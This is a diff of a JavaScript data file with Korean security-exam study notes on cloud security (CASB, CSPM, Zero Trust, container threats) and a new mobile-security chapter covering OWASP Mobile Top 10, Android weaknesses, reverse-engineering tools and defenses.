+    <tr><td><strong>내부자 위협</strong></td><td>과도한 IAM 권한, 권한 남용</td><td>최소 권한 IAM, 접근 로그 감사</td></tr>
+    <tr><td><strong>공급망 공격</strong></td><td>서드파티 이미지·라이브러리 취약점</td><td>이미지 서명 검증, SCA</td></tr>
+    <tr><td><strong>API 취약점</strong></td><td>인증 없는 API 엔드포인트, 과도한 권한</td><td>API 게이트웨이, 인증·인가 강화</td></tr>
+  </tbody>
+</table>
+
+<h3>CASB (Cloud Access Security Broker)</h3>
+<p>클라우드 서비스와 사용자 사이에 위치해 보안 정책을 적용하는 중개 솔루션.</p>
+<ul>
+  <li><strong>가시성</strong>: 어떤 클라우드 서비스를 누가 어떻게 사용하는지 파악 (Shadow IT 탐지)</li>
+  <li><strong>컴플라이언스</strong>: 규정 준수 여부 모니터링</li>
+  <li><strong>데이터 보안</strong>: DLP, 암호화, 토큰화</li>
+  <li><strong>위협 방어</strong>: 악성코드 탐지, 이상 행동 분석</li>
+</ul>
+
+<h3>CSPM (Cloud Security Posture Management)</h3>
+<p>클라우드 설정 오류를 지속적으로 탐지·교정. S3 Public 버킷, 방화벽 과잉 허용 등 감지.</p>
+
+<h3>Zero Trust</h3>
+<p>"Never Trust, Always Verify" — 내부망도 신뢰하지 않음. 모든 요청을 검증.</p>
+<ul>
+  <li><strong>핵심 원칙</strong>: 명시적 검증, 최소 권한 접근, 침해 가정</li>
+  <li><strong>마이크로세그멘테이션</strong>: 내부 네트워크를 작은 세그먼트로 분리. 측면 이동(Lateral Movement) 차단.</li>
+</ul>
+
+<h3>컨테이너 보안</h3>
 <table>
   <thead><tr><th>위협</th><th>대응</th></tr></thead>
   <tbody>
-    <tr><td>SQL Injection</td><td>Prepared Statement, 입력 검증, WAF</td></tr>
-    <tr><td>권한 남용 (내부자)</td><td>최소 권한, 직무 분리, DB 감사, DAM</td></tr>
-    <tr><td>데이터 도난</td><td>암호화, 데이터 마스킹, DLP</td></tr>
-    <tr><td>DB 서버 취약점</td><td>패치 관리, 불필요 기능 비활성화</td></tr>
-    <tr><td>백업 데이터 노출</td><td>백업 파일 암호화, 접근 제어</td></tr>
+    <tr><td>취약한 베이스 이미지</td><td>이미지 취약점 스캔 (Trivy, Snyk), 공식 최소 이미지 사용</td></tr>
+    <tr><td>컨테이너 권한 상승</td><td>비특권(non-root) 컨테이너 실행, --privileged 금지</td></tr>
+    <tr><td>시크릿 하드코딩</td><td>환경변수·시크릿 관리 도구(Vault, K8s Secrets) 사용</td></tr>
+    <tr><td>컨테이너 탈출</td><td>컨테이너 런타임 최신 유지, seccomp/AppArmor 프로파일 적용</td></tr>
   </tbody>
 </table>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'mobile-security',
+    chapterLabel: '모바일 보안',
+    keywords: ['안드로이드', 'iOS', 'APK', '루팅', '탈옥', '모바일 앱', 'SSL Pinning', '역공학', '난독화', 'MDM', 'MAM', 'OWASP Mobile Top 10', '인텐트', 'WebView', '권한'],
+    content: `
+
+<h3>Android vs iOS 보안 구조 비교</h3>
+<table>
+  <thead><tr><th>항목</th><th>Android</th><th>iOS</th></tr></thead>
+  <tbody>
+    <tr><td><strong>샌드박스</strong></td><td>Linux 기반 프로세스 격리</td><td>iOS 샌드박스, 엄격한 앱 격리</td></tr>
+    <tr><td><strong>권한 모델</strong></td><td>설치 시 또는 런타임 권한 요청</td><td>런타임 권한 요청 (더 세분화)</td></tr>
+    <tr><td><strong>앱 스토어</strong></td><td>Google Play + 사이드로딩 가능</td><td>App Store만 (공식) — 탈옥 시 우회</td></tr>
+    <tr><td><strong>루팅/탈옥</strong></td><td>루팅(Rooting): 슈퍼유저 권한 획득</td><td>탈옥(Jailbreak): 샌드박스·서명 제한 우회</td></tr>
+    <tr><td><strong>앱 서명</strong></td><td>개발자 자체 서명</td><td>Apple 인증서 필수</td></tr>
+  </tbody>
+</table>
+
+<h3>OWASP Mobile Top 10 (2023)</h3>
+<table>
+  <thead><tr><th>순위</th><th>항목</th><th>핵심 내용</th></tr></thead>
+  <tbody>
+    <tr><td>M1</td><td>부적절한 자격증명 사용</td><td>하드코딩 키, 취약한 인증</td></tr>
+    <tr><td>M2</td><td>공급망 취약점</td><td>취약한 서드파티 SDK·라이브러리</td></tr>
+    <tr><td>M3</td><td>안전하지 않은 인증·인가</td><td>클라이언트 측 인증 우회</td></tr>
+    <tr><td>M4</td><td>불충분한 입력/출력 검증</td><td>인젝션, XSS (하이브리드 앱)</td></tr>
+    <tr><td>M5</td><td>안전하지 않은 통신</td><td>인증서 검증 안 함, 평문 전송</td></tr>
+    <tr><td>M6</td><td>부적절한 프라이버시 통제</td><td>개인정보 과도 수집·저장</td></tr>
+    <tr><td>M7</td><td>불충분한 바이너리 보호</td><td>역공학, 코드 주입, 난독화 부재</td></tr>
+    <tr><td>M8</td><td>보안 설정 오류</td><td>디버그 모드, 과도한 권한</td></tr>
+    <tr><td>M9</td><td>안전하지 않은 데이터 저장</td><td>평문 저장, 로그 노출</td></tr>
+    <tr><td>M10</td><td>불충분한 암호화</td><td>취약한 알고리즘, 하드코딩 키</td></tr>
+  </tbody>
+</table>
+
+<h3>Android 주요 보안 취약점</h3>
+<ul>
+  <li><strong>암묵적 Intent 취약점</strong>: 수신 앱을 특정하지 않은 Intent. 악성 앱이 가로채 민감 데이터 획득.</li>
+  <li><strong>exported 컴포넌트</strong>: AndroidManifest에서 exported=true로 설정된 Activity·Service를 외부 앱이 직접 호출.</li>
+  <li><strong>WebView 취약점</strong>: JavaScript 허용 + addJavascriptInterface → XSS로 기기 제어 가능. 최신 SDK는 제한 강화.</li>
+</ul>
+
+<h3>모바일 앱 공격 기법</h3>
+<table>
+  <thead><tr><th>기법</th><th>설명</th><th>사용 도구</th></tr></thead>
+  <tbody>
+    <tr><td><strong>역공학 (Reverse Engineering)</strong></td><td>APK 디컴파일로 소스코드·로직 분석</td><td>apktool, dex2jar, jadx</td></tr>
+    <tr><td><strong>동적 분석</strong></td><td>실행 중 앱의 메모리·API 호출 분석</td><td>Frida, objection</td></tr>
+    <tr><td><strong>SSL Pinning 우회</strong></td><td>인증서 고정 우회로 트래픽 가로채기</td><td>Frida 스크립트, objection</td></tr>
+    <tr><td><strong>루팅/탈옥 악용</strong></td><td>루팅된 기기에서 앱 데이터·키 추출</td><td>ADB, ssh</td></tr>
+  </tbody>
+</table>
+
+<h3>모바일 앱 방어</h3>
+<ul>
+  <li><strong>난독화 (ProGuard/R8)</strong>: 클래스명·메서드명 난독화로 역공학 어렵게.</li>
+  <li><strong>루팅·탈옥 탐지</strong>: SafetyNet Attestation(Android), jailbreak 탐지 라이브러리(iOS) 적용.</li>
+  <li><strong>SSL Pinning</strong>: 앱 내에 서버 인증서·공개키 고정. MITM 공격 방어.</li>
+  <li><strong>앱 서명 검증</strong>: 런타임에 APK 서명을 확인해 변조 탐지.</li>
+  <li><strong>난독화 + 무결성 검사</strong>: 앱 변조 탐지 시 실행 중단.</li>
+</ul>
+
+<h3>MDM / MAM</h3>
+<table>
+  <thead><tr><th>구분</th><th>관리 범위</th><th>특징</th></tr></thead>
+  <tbody>
+    <tr><td><strong>MDM (Mobile Device Management)</strong></td><td>기기 전체</td><td>원격 잠금·초기화, 정책 강제 적용, 기기 등록 필요</td></tr>
+    <tr><td><strong>MAM (Mobile Application Management)</strong></td><td>특정 앱만</td><td>개인 기기 BYOD에 적합. 앱 컨테이너 분리.</td></tr>
+  </tbody>
+</table>
+
+<h3>모바일 결제 보안</h3>
+<ul>
+  <li><strong>NFC (Near Field Communication)</strong>: 근거리 무선 통신. 결제 토큰화로 실제 카드번호 미전송.</li>
+  <li><strong>TEE (Trusted Execution Environment)</strong>: 메인 OS와 격리된 보안 실행 환경. 생체정보·키 보관.</li>
+  <li><strong>생체인증</strong>: 지문·얼굴인식. TEE 또는 Secure Enclave에서 처리. 생체정보 외부 전송 안 됨.</li>
+</ul>
     `,
   },
 
